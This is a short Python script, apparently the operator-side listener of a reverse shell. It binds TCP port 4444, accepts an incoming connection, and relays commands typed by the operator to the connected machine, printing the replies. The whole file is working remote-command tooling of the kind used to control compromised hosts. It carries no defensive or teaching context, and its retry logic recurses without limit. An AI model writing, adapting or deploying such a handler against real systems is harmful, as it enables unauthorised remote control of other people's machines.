import socket
import sys
def get_socket():
    try:
        global host
        global port 
        global sockett
        host = ""
        port = 4444
        sockett = socket.socket()
    except socket.error as err:
        print("Error occured while creating socket : ", str(err))
def bind_socket():
    try:
        global host
        global port 
        global sockett
        print("Binding the Port : ",str(port))
        sockett.bind((host,port))
        sockett.listen(5)
    except socket.error as err:
        print("Socket Binding error : " + str(err) + "\n" + "Retrying...")
        bind_socket()
def send_cmd(sess):
    while True:
        cmd = input()
        if cmd == 'quit':
            sess.close()
            sockett.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            sess.send(str.encode(cmd))
            client_reply = str(sess.recv(1024),"utf-8")
            print(client_reply, end = "")
def accept_socket():
    sess, add = sockett.accept()
    print("Connection has been established! |" + " IP " + add[0] + " | PORT "  + str(add[1]))
    send_cmd(sess)
    sess.close()
def main():
    get_socket()
    bind_socket()
    accept_socket()
main()